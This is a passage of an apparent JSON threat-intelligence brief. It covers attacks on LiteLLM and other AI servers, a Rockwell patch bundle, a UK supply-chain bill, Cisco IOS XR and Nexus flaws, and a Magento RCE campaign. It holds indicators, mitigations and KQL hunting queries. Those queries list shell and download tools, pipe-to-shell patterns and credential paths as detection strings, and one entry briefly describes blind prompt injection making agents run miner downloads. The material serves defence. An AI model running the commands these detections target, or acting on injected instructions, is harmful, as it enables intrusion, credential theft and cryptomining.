    "note": "Compromised WordPress site used for binary staging (Wiz)"
   },
   {
    "type": "URL",
    "value": "hxxp://185.62.1[.]8/mon/mon.zip",
    "note": "Miner archive retrieved by the injected MCP test-configuration command (Wiz)"
   },
   {
    "type": "Filename",
    "value": "/tmp/.dbus-cache/gmon",
    "note": "Monero miner binary; staging directory /tmp/.dbus-cache/ is deleted after launch while the process holds the inode (Wiz)"
   },
   {
    "type": "Filename",
    "value": "/tmp/x86_64, /tmp/amd64",
    "note": "Langflow dropper, self-deleting (Wiz)"
   },
   {
    "type": "Filename",
    "value": "/usr/src/node-red/xmrig",
    "note": "XMRig staged inside the Node-RED tree after blind prompt injection (Wiz)"
   },
   {
    "type": "Filename",
    "value": "/app/data/.claude/unicorn",
    "note": "Miner renamed and hidden in a Claude Code config directory on the Langflow honeypot (Wiz)"
   },
   {
    "type": "Behavior",
    "value": "Authorization: Bearer x on /v1/models",
    "note": "Single-character Bearer token exploiting CVE-2026-59822 to probe model enumeration endpoints (Wiz)"
   },
   {
    "type": "Behavior",
    "value": "python3 reading litellm.proxy.proxy_server master_key from module state",
    "note": "Memory-resident master-key theft; no file artefact is produced (Wiz)"
   },
   {
    "type": "Behavior",
    "value": "SELECT against LiteLLM_ProxyModelTable / LiteLLM_VerificationToken",
    "note": "Provider key material and proxy-issued virtual keys harvested from the LiteLLM PostgreSQL tier (Microsoft)"
   },
   {
    "type": "String",
    "value": "sk-1234",
    "note": "LiteLLM default master key; attackers test for it before deciding whether to steal keys or abuse inference quota (Wiz)"
   }
  ],
  "iocNote": "Wiz published a network and file indicator table; Microsoft published behaviour and table names rather than hashes. No SHA256 values for the gmon, unicorn or XMRig binaries appear in either write-up, so none are recorded here. Defanging follows the sources. Note that /tmp/.dbus-cache/ is removed immediately after launch, so a disk sweep after the fact will not find it — the process listing and open file handles will.",
  "mitigation": [
   "Update LiteLLM to 1.83.7 or later and Starlette to 1.0.1 or later. Where patching is not immediate, block POST /mcp-rest/test/connection and POST /mcp-rest/test/tools/list at the reverse proxy or API gateway.",
   "Rotate every credential the proxy could reach — provider API keys, the master key, proxy-issued virtual keys — not just the master key. Memory-resident theft leaves no file artefact to tell you what was taken.",
   "Change any instance still running the default master key sk-1234 immediately; it is a fingerprinting target in its own right.",
   "Inventory the AI stack as production infrastructure with owners and monitoring. Wiz's position is that 'unauthenticated on the internet' should be treated as 'compromised' for Marimo, Flowise, Langflow, Ollama, ChromaDB and Milvus.",
   "Restrict lateral reach: scope IAM permissions on AI proxies narrowly, block outbound egress where possible, and harden every MCP-connected service as though it were internet-facing, because it is inside the blast radius of any proxy compromise.",
   "Deny agents a shell tool unless there is a specific need. Blind prompt injection only reaches command execution when the agent has one.",
   "Remove Docker socket access from workflow and agent containers, and check ~/.ssh/authorized_keys on every AI host for keys you did not add."
  ],
  "response": [
   "DEFENDER XDR KQL — process ancestry is the control Wiz recommends: an AI server spawning a shell catches exploitation regardless of entry vector.\n\n// AI infrastructure — AI service process spawning a shell or interpreter\n// Process-ancestry technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c)\nlet aiParents = dynamic([\"python3\",\"python\",\"uvicorn\",\"gunicorn\",\"node\",\"litellm\",\"ollama\",\"langflow\",\"flowise\"]);\nDeviceProcessEvents\n| where Timestamp > ago(30d)\n| where InitiatingProcessFileName has_any (aiParents)\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"curl\",\"wget\",\"nc\",\"ncat\",\"chmod\",\"base64\")\n| where ProcessCommandLine has_any (\"base64 -d\",\"| bash\",\"curl \",\"wget \",\"chmod 777\",\"chmod 755\",\"start_new_session\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| sort by Timestamp desc",
   "DEFENDER XDR KQL — the specific post-exploitation tradecraft: master-key extraction from module state, config enumeration and the staging paths.\n\n// AI infrastructure — LiteLLM credential theft and miner staging\nlet credPatterns = dynamic([\"litellm.proxy.proxy_server\",\"litellm_master_key_hash\",\"master_key\",\"/app/litellm_config.yaml\",\"/etc/litellm/.env\",\"/.litellm/config.yaml\",\"sk-1234\"]);\nlet stagePaths = dynamic([\"/tmp/.dbus-cache\",\"/usr/src/node-red/xmrig\",\"/app/data/.claude\",\"/tmp/x86_64\",\"/tmp/amd64\"]);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > ago(30d)\n   | where ProcessCommandLine has_any (credPatterns) or ProcessCommandLine has_any (stagePaths)\n   | project Timestamp, DeviceName, AccountName, Signal = \"process\", Evidence = ProcessCommandLine),\n  (DeviceFileEvents\n   | where Timestamp > ago(30d)\n   | where FolderPath has_any (stagePaths) or FileName in~ (\"gmon\",\"unicorn\",\"xmrig\")\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Signal = \"file\", Evidence = strcat(FolderPath, \" | \", FileName)),\n  (DeviceFileEvents\n   | where Timestamp > ago(30d)\n   | where FileName =~ \"authorized_keys\"\n   | where InitiatingProcessFileName has_any (dynamic([\"python3\",\"python\",\"sh\",\"bash\",\"node\"]))\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Signal = \"ssh-persistence\", Evidence = strcat(FolderPath, \" modified by \", InitiatingProcessFileName))\n| sort by Timestamp desc",
   "SENTINEL KQL — the published network indicators plus mining-pool egress, unioned so the query survives missing connectors.\n\n// AI infrastructure — Wiz-published infrastructure and mining egress\nlet lookback = 30d;\nlet badIPs = dynamic([\"185.62.1.8\",\"185.84.98.85\",\"94.26.106.29\"]);\nlet badDomains = dynamic([\"pool.hashvault.pro\",\"crazyeltonproxy.top\",\"1710.rwlp.be\"]);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where DestinationIP in (badIPs) or RequestURL has_any (badDomains) or DestinationHostName has_any (badDomains)\n   | project TimeGenerated, Source = \"CommonSecurityLog\", Host = DeviceName, Evidence = coalesce(RequestURL, DestinationHostName, DestinationIP)),\n  (DnsEvents\n   | where TimeGenerated > ago(lookback)\n   | where Name has_any (badDomains) or Name has \"oast.\" or Name has \"hashvault\"\n   | project TimeGenerated, Source = \"DnsEvents\", Host = Computer, Evidence = Name),\n  (DeviceNetworkEvents\n   | where Timestamp > ago(lookback)\n   | where RemoteIP in (badIPs) or RemoteUrl has_any (badDomains)\n   | project TimeGenerated = Timestamp, Source = \"DeviceNetworkEvents\", Host = DeviceName, Evidence = coalesce(RemoteUrl, RemoteIP))\n| sort by TimeGenerated desc",
   "SENTINEL KQL — blind prompt injection leaves its only reliable trace in DNS: an OAST callback from a host running an agent framework.\n\n// AI infrastructure — OAST callback consistent with blind prompt injection\nDnsEvents\n| where TimeGenerated > ago(30d)\n| where Name has_any (\"oast.fun\",\"oast.pro\",\"oast.site\",\"oast.live\",\"interact.sh\",\"burpcollaborator.net\",\"requestbin\")\n| extend label = tostring(split(Name, \".\")[0])\n| summarize callbacks = count(), names = make_set(Name, 20), first = min(TimeGenerated), last = max(TimeGenerated) by Computer, ClientIP\n| sort by last desc",
   "Where an AI host shows any of these signals, rotate provider keys before rebuilding. The credentials are the objective; the miner is the visible part."
  ],
  "source": "Wiz Threat Research — Yaara Shriki, \"Inside 90 days of attacks on AI infrastructure\", Aug 27, 2026; Microsoft Security Blog, \"When AI infrastructure becomes a target\", Aug 26, 2026; The Hacker News",
  "sourceNote": "Aug 26 – Sep 3, 2026"
 },
 "rockwellsep": {
  "eyebrow": "Rockwell Automation · Patch bundle · Sep 2–3, 2026",
  "title": "More than a dozen fixes across RSLinx Classic, ControlLogix, FactoryTalk and ArmorStart",
  "tags": [
   [
    "med",
    "Critical Manufacturing"
   ],
   [
    "med",
    "No known exploitation"
   ]
  ],
  "overview": "A scheduled remediation item rather than an incident. It is carried here because the affected list spans controllers and the engineering workstation software that talks to them, which is the pairing that matters for OT change windows.",
  "technical": [
   "Products with patches or workarounds: RSLinx Classic, ControlLogix and CompactLogix controllers, FactoryTalk Historian Machine Edition, FactoryTalk Activation Manager, ArmorStart Distributed Motor Controllers, ControlFLASH, and the Redundancy Module Configuration Tool.",
   "Reported weakness classes: denial of service, remote code execution, privilege escalation and cross-site scripting.",
   "CISA states it is not aware of exploitation of CVE-2026-9637."
  ],
  "iocs": [],
  "iocNote": "No indicators published — no exploitation is known and this is a vendor patch release.",
  "mitigation": [
   "Fold the controller and workstation fixes into the same change window; patching RSLinx Classic without the controllers, or the reverse, leaves the communication path half-remediated.",
   "Where a controller cannot be taken down inside the window, apply the vendor workaround and record the exception with a review date rather than deferring silently."
  ],
  "response": [
   "DEFENDER XDR KQL — no exploitation is reported and there are no indicators, so the query that applies is an exposure count against the patch bundle. Run it on engineering workstations and OT-adjacent Windows hosts rather than expecting coverage on the controllers themselves.\n\n// Rockwell Automation Sep 2026 bundle — exposed software on managed hosts\nlet products = dynamic([\"RSLinx\",\"FactoryTalk\",\"Studio 5000\",\"ControlLogix\",\"CompactLogix\",\"ArmorStart\"]);\nunion isfuzzy=true\n  (DeviceTvmSoftwareVulnerabilities\n   | where SoftwareVendor has \"rockwell\" or SoftwareName has_any (products)\n   | summarize Cves = make_set(CveId, 20), Devices = dcount(DeviceId), Hosts = make_set(DeviceName, 15)\n       by SoftwareName, SoftwareVersion, RecommendedSecurityUpdate\n   | extend Leg = \"known vulnerable version\"),\n  (DeviceTvmSoftwareInventory\n   | where SoftwareVendor has \"rockwell\" or SoftwareName has_any (products)\n   | summarize Devices = dcount(DeviceId), Hosts = make_set(DeviceName, 15)\n       by SoftwareName, SoftwareVersion\n   | extend Leg = \"installed, patch state unconfirmed\")\n| sort by Leg asc, Devices desc",
   "SENTINEL KQL — where the estate has no vulnerability connector on the OT side, substitute an access view: who reaches the engineering workstations that talk to the controllers, and from where.\n\n// Access to Rockwell engineering workstations\nlet since = ago(30d);\nlet ews = DeviceTvmSoftwareInventory\n  | where SoftwareVendor has \"rockwell\" or SoftwareName has_any (dynamic([\"RSLinx\",\"FactoryTalk\",\"Studio 5000\"]))\n  | distinct DeviceName;\nunion isfuzzy=true\n  (SecurityEvent\n   | where TimeGenerated > since\n   | where EventID in (4624, 4625)\n   | where Computer in~ (ews)\n   | where LogonType in (3, 10)\n   | summarize Logons = count(), Outcome = make_set(EventID, 2) by Computer, Account, IpAddress\n   | project Host = Computer, Leg = \"remote logon to engineering workstation\", Evidence = strcat(Account, \" from \", IpAddress, \" x\", Logons)),\n  (DeviceProcessEvents\n   | where TimeGenerated > since\n   | where DeviceName in~ (ews)\n   | where FileName in~ (\"mstsc.exe\",\"psexec.exe\",\"anydesk.exe\",\"teamviewer.exe\",\"ScreenConnect.ClientService.exe\")\n   | project Host = DeviceName, Leg = \"remote-access tooling on OT-adjacent host\", Evidence = ProcessCommandLine)\n| summarize Events = count(), Detail = make_set(Evidence, 8) by Host, Leg\n| sort by Host asc",
   "CISA is not aware of exploitation of CVE-2026-9637. Treat both queries as inventory and access hygiene rather than incident response, and re-run the first one after the patch window to confirm the count fell."
  ],
  "source": "Rockwell Automation security advisories, CISA ICS advisories, Security Boulevard Daily OT Security News",
  "sourceNote": "Sep 2–3, 2026"
 },
 "ukcsrb": {
  "eyebrow": "UK Cyber Security and Resilience Bill · Amendments tabled Aug 24, 2026",
  "title": "Ministers would gain powers to bar high-risk technology suppliers from critical sectors",
  "tags": [
   [
    "med",
    "All Sectors"
   ],
   [
    "med",
    "Policy · Supply chain"
   ]
  ],
  "overview": "A policy development with direct bearing on the Iran-linked OT disruption already carried in this brief: the amendments followed reporting that a small UK energy facility was forced offline for four days, and they move supplier risk from guidance into ministerial power.",
  "technical": [
   "SecurityWeek reported on Sep 2, 2026 that late amendments to the UK Cyber Security and Resilience Bill, tabled Aug 24, would give ministers powers to prevent critical-sector organisations from using technology suppliers deemed high risk.",
   "The bill has passed the House of Commons and is currently in the House of Lords.",
   "The amendments followed reporting that Iran-linked adversaries forced a small UK energy facility offline for four days.",
   "Separately, a Foundation for Defense of Democracies analysis dated Sep 2 describes Project Watershed 250, launched Aug 31 as a six-month Texas pilot pairing local water utilities with free federal, state and private-sector cybersecurity services, alongside proposed dedicated water-sector cybersecurity funding and Water Watch Center threat-intelligence and vulnerability-management support."
  ],
  "iocs": [],
  "iocNote": "Policy item — no technical indicators.",
  "mitigation": [
   "UK critical-sector operators should be able to produce a current technology supplier inventory with country-of-origin and support-chain detail. That is the artefact a designation regime asks for first.",
   "Where a supplier is plausibly in scope, identify the replacement path and its lead time now rather than after a designation."
  ],
  "response": [
   "No hunting queries: this is a legislative and funding item with no adversary activity of its own. The related operational record is the Iran-linked OT disruption story in this brief."
  ],
  "source": "SecurityWeek, Foundation for Defense of Democracies, Security Boulevard Daily OT Security News",
  "sourceNote": "Sep 2–3, 2026"
 },
 "ciscosep": {
  "eyebrow": "Cisco PSIRT · September 2026 advisory set · Sep 2, 2026",
  "title": "Seven CWE-grouped IOS XR CVEs and a root-level Nexus 9000 RCE, with no workarounds",
  "tags": [
   [
    "crit",
    "Communications"
   ],
   [
    "high",
    "Not known to be exploited"
   ]
  ],
  "overview": "Two things make this bundle worth carrying despite the absence of exploitation. Cisco states the IOS XR issues affect all releases regardless of device configuration and that there are no workarounds, so exposure cannot be reduced by configuration review. The Nexus 9000 flaw now has a fixed-release table — Cisco lists 45 affected NX-OS releases — but the IOS XR side is an upgrade programme rather than a patch: of 111 affected releases, 93 must be upgraded before a fix can be applied at all. The Fire Ant context matters for triage order: implants on IOS XR routers that suppress syslog were reported six days earlier, which is an argument for treating router telemetry gaps as suspicious while patching.",
  "technical": [
   "Cisco grouped the internally discovered IOS XR issues by CWE class and assigned one CVE per grouping: CVE-2026-20274 through CVE-2026-20280. CVE-2026-20274 and CVE-2026-20279 are CVSS 9.8; CVE-2026-20275 through CVE-2026-20278 and CVE-2026-20280 range from 8.2 to 8.8.",
   "CVE-2026-20274 — resource-lifecycle flaws such as buffer overflows and use-after-free. An attacker sends malformed network packets to trigger memory corruption inside core routing daemons.",
   "CVE-2026-20279 — broken access control, including missing authentication for critical functions and improper certificate validation. A threat actor bypasses authorization checks to perform administrative actions without valid credentials.",
   "CVE-2026-20278 covers input sanitisation failures in dynamic commands. The affected services span BGP, OSPF, IS-IS and gRPC endpoints.",
   "Cisco's advisory language: the vulnerabilities affect all releases regardless of device configuration, there are no workarounds, and they \"were found during internal security testing using existing testing processes as well as frontier AI models.\" Cisco states they are not known to be actively exploited.",
   "Remediation path for IOS XR is to upgrade to a release that includes software maintenance updates and then apply them. XR7 (LNT) platforms — Cisco 8000 Series, NCS 1010, NCS 540L, NCS 5700 Series — have a dedicated SMU that applies across all releases.",
   "CVE-2026-20212 (CVSS 9.8), advisory cisco-sa-n9k-s1-rce-EH8dEtr — Nexus 9000 Series switches running a Cisco Silicon One ASIC. The vulnerability is an unintended network exposure in the Silicon One integration: TCP ports 43210 and 43211 are accessible through the default Layer 3 VRF, and crafted input sent to the service on either port is executed with root privileges. Exploitation can also crash the S1HAL process and force the switch to reload. Cisco lists 10 affected Silicon One-based product identifiers and 45 affected NX-OS releases beginning at 10.3(1) and extending through 10.6(3) and 10.6(3s); because exposure depends on both model and release, Cisco directs customers to its Software Checker and the show module CLI command rather than the version range alone. Cisco TAC discovered the flaw while investigating a customer support case, and PSIRT states it is not aware of public disclosure or malicious use as of Sep 2, 2026.",
   "IOS XR fix coverage, cross-checked by The Hacker News against the advisory on Sep 3: of the 111 IOS XR releases Cisco lists as affected, 14 have SMUs available, four are awaiting SMUs, and 93 must first be upgraded before a fix can be applied. Cisco says approximately 16 SMUs may be available for each release, and that releases 26.2.2 and 26.3.1 will be the first fixed releases needing no SMUs; customers on a release outside the table are told to open a TAC case. SMU identifiers by functional area include CSCwv19790 for all XR7 (LNT) platforms across all releases, CSCwu14807 for BGP, CSCwu36622 for Zero Touch Provisioning, and CSCwv19171 for both IS-IS and OSPF. The Sep 2 drop is the third scheduled hardening release in 30 days.",
   "CVE-2026-20281 (CVSS 7.5) — denial of service on Desk Phone 9800, IP Phone 7800 and 8800, and Video Phone 8875 registered to Unified Communications Manager with Web Access enabled, which is off by default. Fixes in SIP Software 5.0(1), 14.4(1)SR3, 14.4(1)SR4 or 11.0(6)SR8 depending on model.",
   "CVE-2026-20354 and CVE-2026-20355 (CVSS 5.9) — publicly disclosed S/MIME ciphertext decryption flaws in Cisco Secure Email. A machine-in-the-middle attacker can recover plaintext from mail passing between gateways running AsyncOS 16.5.0 or earlier with S/MIME configured. Fixed releases are stated only in the bug records.",
   "Context reported by The Hacker News: the advisories came six days after Sygnia described the China-nexus actor Fire Ant, first documented in 2025, running purpose-built implants on IOS XR routers that suppressed syslog delivery."
  ],
  "iocs": [],
  "iocNote": "No indicators — these are vendor-discovered vulnerabilities with no known exploitation. Indicators for the separate Fire Ant IOS XR implant activity are in Sygnia's own reporting and are not reproduced here.",
  "mitigation": [
   "IOS XR: upgrade to a release carrying the September 2026 SMUs and apply them. There are no workarounds and configuration review will not reduce exposure, because all releases are affected regardless of configuration.",
   "Nexus 9000 Silicon One: check the device PID with show module against Cisco's list of 10 affected Silicon One products, then use the Software Checker to establish a target NX-OS release. In the meantime apply an infrastructure access control list blocking TCP 43210 and 43211, and deploy the Live Protect shield for NX-OS 10.6(3) as temporary cover, not a fix. Cisco advises testing any workaround in your own environment first, as it can affect network function or performance.",
   "Cisco Secure Email: where S/MIME is configured on AsyncOS 16.5.0 or earlier, the fixed releases are only in the bug records — confirm the target build against the bug entry rather than the advisory table.",
   "IP phones: confirm Web Access is disabled, which is the default and removes the CVE-2026-20281 path without patching.",
   "Given the Fire Ant reporting, treat any unexplained gap in router syslog delivery as an investigation trigger rather than a logging fault, and verify router log continuity independently of the routers themselves."
  ],
  "response": [
   "SENTINEL KQL — router syslog continuity, which is the detection that matters given implants reported to suppress syslog delivery. Absence of logs is the signal.\n\n// Cisco IOS XR — syslog delivery gaps by device\n// Gap-detection technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c)\nlet lookback = 14d;\nlet bin_size = 1h;\nSyslog\n| where TimeGenerated > ago(lookback)\n| where ProcessName has_any (\"bgp\",\"ospf\",\"isis\",\"emsd\",\"ios_xr\",\"nx-os\") or Computer has_any (\"xr\",\"ncs\",\"nexus\")\n| summarize events = count() by Computer, bin(TimeGenerated, bin_size)\n| summarize hours_reported = dcount(TimeGenerated), total = sum(events), first = min(TimeGenerated), last = max(TimeGenerated) by Computer\n| extend expected_hours = toint(lookback / bin_size)\n| extend missing_hours = expected_hours - hours_reported\n| where missing_hours > 4\n| project Computer, hours_reported, missing_hours, total, first, last\n| sort by missing_hours desc",
   "SENTINEL KQL — management-plane reachability of the Nexus 9000 ports the iACL is meant to block, to confirm the stopgap is actually in force.\n\n// Cisco Nexus 9000 CVE-2026-20212 — inbound reach to by-default open ports\nlet lookback = 7d;\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where DeviceProduct has_any (\"Nexus\",\"NX-OS\") or DestinationHostName has \"nexus\"\n   | where DeviceAction !in~ (\"deny\",\"drop\",\"denied\",\"blocked\")\n   | project TimeGenerated, Src = SourceIP, Dst = DestinationIP, Port = DestinationPort, Action = DeviceAction),\n  (AzureDiagnostics\n   | where TimeGenerated > ago(lookback)\n   | where Category has \"Firewall\"\n   | where msg_s has \"nexus\"\n   | project TimeGenerated, Src = \"\", Dst = \"\", Port = 0, Action = msg_s)\n| summarize attempts = count(), sources = dcount(Src) by Dst, Port, Action\n| sort by attempts desc",
   "No exploitation-based hunting is possible yet: Cisco reports no known exploitation and published no indicators. The two queries above test your own visibility and control state, which is the actionable work while patching proceeds."
  ],
  "source": "Cisco PSIRT — IOS XR Software Security Hardening Release: September 2026 (cisco-sa-hardening-iosxr-qg64NcM) and Nexus 9000 Silicon One advisory; SecurityWeek; The Hacker News; securityonline.info; CVE Brief",
  "sourceNote": "Sep 2–3, 2026"
 },
 "stylesmuggler": {
  "eyebrow": "Magento / Adobe Commerce · CVE-2026-75650 · CVSS 10.0 · Exploited from Sep 4, hotfix Sep 7",
  "title": "Three days of unauthenticated RCE against every supported Magento version before a patch existed",
  "tags": [
   [
    "crit",
    "Commercial Facilities"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "This is the week's clearest patch-then-investigate case. Sansec found the campaign on Sep 4 at 22:40 UTC, published early on Sep 5 while stores were being compromised, and Adobe shipped an emergency hotfix on Sep 7 — so vulnerable stores were exposed for roughly three days with no fix available, and Sansec is explicit that patching closes the hole but does not clean a store that was already hit. Patch level offers no reassurance: the first confirmed victim was running 2.4.6-p15 with all available security patches applied, and Sansec reproduced the chain on clean 2.4.7, 2.4.8 and 2.4.9 installations. The exploitation path is also unusually quiet for defenders who look only at web logs — the payload executes while Magento renders a routine \"Payment Transaction Failed Reminder\" email, including when delivery fails, so there is no request that visibly triggers code execution. The implant is a small Rust binary that changed its disguise mid-campaign (kworker, then fc-cache, then chronyd) and changed its transport from TLS/WebSockets to traffic shaped like NTP, which means name-based and port-based detections built on Sep 5 reporting will already be behind. Two operators are documented, and one merchant saw a session-storage attempt fail and a custom-options file upload succeed eight seconds later, so a single blocked vector is not containment.",
  "technical": [
   "Chain: PHP code is injected into Magento's template system using the styles properties, which lets it evade existing safeguards. Stage one poisons the code, for example by generating a failure report; stage two lets Magento execute it while rendering the 'Payment Transaction Failed Reminder' email. Sansec states no user interaction is required and the attack can also succeed when email delivery fails.",
   "Affected versions per Sansec: every release from 2.4.4 up to and including 2.4.9, Magento Open Source and Adobe Commerce alike. Sansec reproduced the full unauthenticated chain on clean 2.4.7, 2.4.8 and 2.4.9 installations; the first confirmed victim ran 2.4.6-p15 with all available security patches applied.",
   "Fix: Adobe published an emergency hotfix on Sep 7, 2026 for CVE-2026-75650, CVSS 10.0, distributed as VULN-39341 under APSB26-146. Before that, Sansec and reporting recommended disabling GraphQL as an interim mitigation.",
   "Implant: a compact Rust-based Linux backdoor run as a background process. Early samples used the process name [kworker/u:8:0], mimicking a kernel worker; samples observed Sep 6 use fc-cache and copy the binary to ~/.cache/fontconfig/fc-cache. Sansec documents an additional chronyd variant and references a gvfsd-user name.",
   "Persistence: a cron job configured to repeat every 30 minutes (BleepingComputer, citing Sansec).",
   "Command and control: earlier samples used TLS and WebSockets. Newer samples disguise traffic as NTP — UDP packets to port 123 using hostnames that resemble time-syncing infrastructure, which helps the traffic pass firewalls. Sansec's own keyword list names 247.cdnflare.xyz.",
   "Environment checks: the malware determines the server's public IP through ipify, icanhazip, ident.me and ipinfo.io, and reads Linux's TracerPid value to detect tracing. If tracing is active it still installs but does not beacon.",
   "Second operator and alternative vector: Sansec documents a second attacker and a recon probe, and reports one merchant where an attempt failed against session storage and a second attempt eight seconds later succeeded using a file uploaded through Magento's custom options — both from the same operator. Moving sessions to Redis or the database does not stop the attack.",
   "Scale of exposed estate: Magento is installed on more than 160,000 websites, including 14,000 of the top one million sites (BleepingComputer)."
  ],
  "iocs": [
   {
    "type": "Behavior",
    "value": "Background process named [kworker/u:8:0] on a Magento host",
    "note": "Early implant disguise mimicking a Linux kernel worker (Sansec)"
   },
   {
    "type": "Filename",
    "value": "~/.cache/fontconfig/fc-cache",
    "note": "Later implant copies itself here and runs as fc-cache, impersonating the font-cache utility (Sansec, samples observed Sep 6)"
   },
   {
    "type": "Behavior",
    "value": "Process named chronyd or gvfsd-user not owned by the expected service account",
    "note": "Further implant variants named in Sansec's advisory"
   },
   {
    "type": "Domain",
    "value": "247.cdnflare.xyz",
    "note": "Command-and-control hostname listed in Sansec's advisory keywords; verify against the live advisory, which Sansec is updating as the actors iterate"
   },
   {
    "type": "Behavior",
    "value": "Cron entry repeating every 30 minutes on a Magento server",
    "note": "Persistence mechanism reported by Sansec via BleepingComputer"
   },
   {
    "type": "Behavior",
    "value": "Outbound UDP to port 123 with payloads that do not parse as NTP, to hosts resembling time-sync infrastructure",
    "note": "Newer C2 transport disguised as NTP; earlier samples used TLS/WebSockets"
   },
   {
    "type": "Behavior",
    "value": "Server-side requests to ipify, icanhazip, ident.me or ipinfo.io from a web server",
    "note": "Public-IP discovery performed by the implant on install"
   },
   {
    "type": "String",
    "value": "x_trace_",
    "note": "Template artefact in Magento's var/report/ directory, per cyberpress.org reporting of Sansec's guidance"
   },
   {
    "type": "Behavior",
    "value": "Unexpected burst of 'Payment Transaction Failed Reminder' emails, especially with unresolved template variables or zero-amount totals",
    "note": "Exploitation signal; Sansec notes legitimate declined payments can generate the same notification"
   }
  ],
  "iocNote": "No file hashes were published in the reporting reviewed, so no SHA256 is recorded — the implant is being rebuilt as the actors iterate, and Sansec states it is updating its advisory with new indicators as it learns more. Check the live Sansec advisory before hunting on names alone: the process name changed twice inside three days.",
  "mitigation": [
   "Apply Adobe's VULN-39341 hotfix for CVE-2026-75650 (APSB26-146), published Sep 7. Every release from 2.4.4 through 2.4.9 is affected.",
   "Do not treat patching as remediation. Stores were exploited for three days before the hotfix existed, so scan before assuming the store is clean.",
   "Scan for the implant and secondary backdoors — Sansec offers eComscan for this; independently, look for the process names, the cron entry and the fontconfig path.",
   "Rotate credentials on any store where indicators are found: flush session storage, rotate the Magento encryption key (crypt/key in app/etc/env.php), and reset all admin passwords, payment provider API keys and integration credentials.",
   "Where the hotfix cannot be applied immediately, disabling GraphQL was the interim mitigation recommended before the patch shipped.",
   "Do not rely on session storage changes: Sansec states moving sessions to Redis or the database does not stop the attack, and documents an alternative path through files uploaded via Magento's custom options."
  ],
  "response": [
   "DEFENDER XDR KQL — the implant hides behind trusted Linux process names, so hunt for those names running from the wrong path or the wrong parent, plus the NTP-shaped beacon. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// StyleSmuggler implant — masquerading process names and NTP-shaped C2\nlet since = datetime(2026-09-04);\nlet masks = dynamic([\"kworker\",\"fc-cache\",\"chronyd\",\"gvfsd-user\"]);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where DeviceType == \"Server\" or InitiatingProcessFileName has_any (\"php-fpm\",\"httpd\",\"nginx\",\"apache2\")\n   | where FileName has_any (masks)\n   | where FolderPath !startswith \"/usr/sbin\" and FolderPath !startswith \"/usr/bin\"\n   | project Timestamp, DeviceName, Leg = \"masquerading process\", Evidence = strcat(FolderPath, FileName, \" <- \", InitiatingProcessFileName)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FolderPath has \".cache/fontconfig\" or FolderPath has \"/var/report/\"\n   | project Timestamp, DeviceName, Leg = \"implant or template artefact\", Evidence = strcat(FolderPath, FileName)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where ProcessCommandLine has_any (\"crontab\",\"/etc/cron\")\n   | where ProcessCommandLine has_any (\"*/30\",\"fc-cache\",\"fontconfig\")\n   | project Timestamp, DeviceName, Leg = \"30-minute cron persistence\", Evidence = ProcessCommandLine),\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where RemotePort == 123 and Protocol =~ \"Udp\"\n   | where InitiatingProcessFileName !in~ (\"chronyd\",\"ntpd\",\"systemd-timesyncd\")\n   | project Timestamp, DeviceName, Leg = \"NTP-shaped beacon from non-NTP process\", Evidence = strcat(InitiatingProcessFileName, \" -> \", RemoteUrl, \":\", RemotePort))\n| summarize Hits = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName, Leg\n| sort by Last desc",
   "SENTINEL KQL — the exploitation signal is on the mail and web side: a burst of failed-payment reminders and server-side calls to public-IP lookup services. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// StyleSmuggler exploitation signals — failed-payment mail burst and IP-discovery callouts\nlet since = datetime(2026-09-04);\nlet lookups = dynamic([\"api.ipify.org\",\"icanhazip.com\",\"ident.me\",\"ipinfo.io\"]);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > since\n   | where RequestURL has_any (\"/graphql\",\"/customer/section/load\",\"custom_options\")\n   | summarize Requests = count() by SourceIP, DestinationHostName, bin(TimeGenerated, 1h)\n   | where Requests > 50\n   | project TimeGenerated, Host = DestinationHostName, Leg = \"burst against Magento endpoints\", Evidence = strcat(SourceIP, \" x\", Requests)),\n  (DeviceNetworkEvents\n   | where TimeGenerated > since\n   | where RemoteUrl has_any (lookups)\n   | where InitiatingProcessFileName has_any (\"php\",\"php-fpm\",\"kworker\",\"fc-cache\",\"chronyd\")\n   | project TimeGenerated, Host = DeviceName, Leg = \"public-IP discovery from web stack\", Evidence = strcat(InitiatingProcessFileName, \" -> \", RemoteUrl)),\n  (Syslog\n   | where TimeGenerated > since\n   | where SyslogMessage has \"Payment Transaction Failed Reminder\"\n   | summarize Mails = count() by Computer, bin(TimeGenerated, 1h)\n   | where Mails > 20\n   | project TimeGenerated, Host = Computer, Leg = \"failed-payment reminder burst\", Evidence = strcat(Mails, \" reminders in one hour\"))\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 6) by Host, Leg\n| sort by Last desc",
   "If the implant is found, isolate the server before cleanup: Sansec documents two operators working the same store and a second delivery vector, so removing one backdoor is not containment.",
   "Rotate the Magento encryption key, admin passwords, payment provider API keys and integration credentials on any affected store, and flush session storage. Sansec's position is that patching closes the hole but does not clean a store that was already hit."
  ],
  "source": "Sansec Forensics Team — StyleSmuggler advisory (published Sep 5, updated Sep 7, 2026 20:45 UTC), BleepingComputer, SecurityWeek, The Hacker News, SOCRadar, SecPod, cyberpress.org",
  "sourceNote": "Sep 5 – Sep 7, 2026"
 },
 "telerikrau": {
